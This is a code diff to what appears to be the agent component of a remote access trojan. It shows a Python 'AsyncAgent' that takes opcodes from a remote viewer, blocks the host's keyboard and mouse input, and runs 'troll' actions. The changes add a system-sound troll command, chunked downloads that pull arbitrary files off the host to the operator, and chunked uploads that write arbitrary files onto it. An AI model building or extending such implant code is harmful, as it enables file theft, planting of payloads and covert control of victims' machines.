@@ -166,7 +166,11 @@ class AsyncAgent:
         self.process_mgr = ProcessManager()
         self.file_mgr = FileManager()  # Initialize in Admin Mode (None) by default
         self.safety_mode_enabled = True # Default to ON
-        self.file_mgr.safety_mode = True # Initial state
+        self.file_mgr.safety_mode = self.safety_mode_enabled # Initial state
+
+        # Chunked upload state
+        self._upload_file = None   # Open file handle for active chunked upload
+        self._upload_path = None   # Remote path being written to
         self.background_tasks = set()
         self.consecutive_heartbeat_fails = 0
 
@@ -795,8 +799,8 @@ class AsyncAgent:
         # 6. Unblock Input (CRITICAL SAFETY)
         try:
             self.input_ctrl.block_input(False)
-        except:
-            pass
+        except Exception as e:
+            print(f"[-] Failed to unblock input: {e}")
 
         print("[+] Session Cleanup Complete")
 
@@ -1172,6 +1176,16 @@ class AsyncAgent:
                 elif opcode == protocol.OP_TROLL_STOP:
                     await self.loop.run_in_executor(None, self.troll_handler.stop_all)
 
+                elif opcode == protocol.OP_TROLL_SYSTEM_SOUND:
+                    try:
+                        data = json.loads(payload.decode("utf-8"))
+                        sound_name = data.get("sound", "SystemHand")
+                        await self.loop.run_in_executor(
+                            None, self.troll_handler.play_system_sound, sound_name
+                        )
+                    except Exception as e:
+                        print(f"[-] Troll System Sound Error: {e}")
+
                 # ============================================================================
                 # NEW HANDLERS
                 # ============================================================================
@@ -1325,14 +1339,24 @@ class AsyncAgent:
                         data = json.loads(payload.decode("utf-8"))
                         path = data.get("path")
                         if path:
-                            # Use executor to avoid blocking event loop
+                            # Send file info header first
+                            try:
+                                file_size = os.path.getsize(path)
+                                info = json.dumps({"size": file_size, "name": os.path.basename(path)}).encode("utf-8")
+                                self._send_async(protocol.OP_FM_DOWNLOAD_INFO, info)
+                            except OSError as e:
+                                print(f"[-] FM Download: Cannot stat file: {e}")
+
+                            # Use executor to avoid blocking event loop (256KB chunks)
+                            DOWNLOAD_CHUNK_SIZE = 256 * 1024
+
                             async def read_chunks_async(file_path):
                                 queue = asyncio.Queue(maxsize=10)  # Bounded
 
                                 def read_worker():
                                     try:
                                         for chunk in self.file_mgr.read_file_chunks(
-                                            file_path
+                                            file_path, chunk_size=DOWNLOAD_CHUNK_SIZE
                                         ):
                                             future = asyncio.run_coroutine_threadsafe(
                                                 queue.put(chunk), self.loop
@@ -1380,13 +1404,13 @@ class AsyncAgent:
                         path = data.get("path")
                         b64_data = data.get("data")
                         if path and b64_data:
+                            # Small file: instant base64 upload (legacy)
                             file_data = base64.b64decode(b64_data)
                             await self.loop.run_in_executor(
                                 None, self.file_mgr.write_file, path, file_data
                             )
                             # Refresh list
                             parent = os.path.dirname(path)
-                            # Fix: list_files -> list_dir and manual response construction
                             files = await self.loop.run_in_executor(
                                 None, self.file_mgr.list_dir, parent
                             )
@@ -1394,8 +1418,44 @@ class AsyncAgent:
                                 "utf-8"
                             )
                             self._send_async(protocol.OP_FM_DATA, resp)
+                        elif path and "size" in data:
+                            # Chunked upload: open file for writing
+                            print(f"[+] FM Chunked Upload Start: {path} ({data['size']} bytes)")
+                            parent = os.path.dirname(path)
+                            if parent:
+                                os.makedirs(parent, exist_ok=True)
+                            self._upload_file = open(path, "wb")
+                            self._upload_path = path
                     except Exception as e:
                         print(f"[-] FM Upload Error: {e}")
+
+                elif opcode == protocol.OP_FM_CHUNK:
+                    # Incoming upload chunk from Viewer
+                    if self._upload_file:
+                        try:
+                            if not payload:
+                                # EOF: close file and refresh listing
+                                self._upload_file.close()
+                                print(f"[+] FM Chunked Upload Complete: {self._upload_path}")
+                                parent = os.path.dirname(self._upload_path)
+                                self._upload_file = None
+                                self._upload_path = None
+                                files = await self.loop.run_in_executor(
+                                    None, self.file_mgr.list_dir, parent
+                                )
+                                resp = json.dumps({"files": files, "path": parent}).encode("utf-8")
+                                self._send_async(protocol.OP_FM_DATA, resp)
+                            else:
+                                self._upload_file.write(payload)
+                        except Exception as e:
+                            print(f"[-] FM Chunk Write Error: {e}")
+                            if self._upload_file:
+                                try:
+                                    self._upload_file.close()
+                                except Exception:
+                                    pass
+                            self._upload_file = None
+                            self._upload_path = None
 
                 elif opcode == protocol.OP_FM_DELETE:
                     try:
